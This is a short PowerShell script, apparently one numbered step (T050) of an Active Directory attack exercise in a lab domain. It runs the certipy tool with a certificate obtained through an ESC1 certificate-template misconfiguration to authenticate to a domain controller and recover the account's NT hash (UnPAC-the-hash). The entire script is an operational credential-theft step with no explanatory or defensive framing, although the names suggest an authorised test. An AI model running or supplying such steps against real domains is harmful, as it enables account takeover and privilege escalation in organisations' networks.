# T050 auth (UnPAC) with esc1.pfx
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
$pfx = "C:\Tools\cadre-attack\C__Tools_cadre-attack_esc1.pfx"
if (Test-Path $pfx) {
  Write-Output "=== certipy auth (UnPAC-the-hash) ==="
  & $certpy auth -pfx $pfx -dc-ip 192.168.77.10 -domain cadre.local 2>&1 | Select-Object -Last 18
  Write-Output "auth_rc=$LASTEXITCODE"
} else { Write-Output "NO_PFX" }
Write-Output "=== AUTH2_DONE ==="
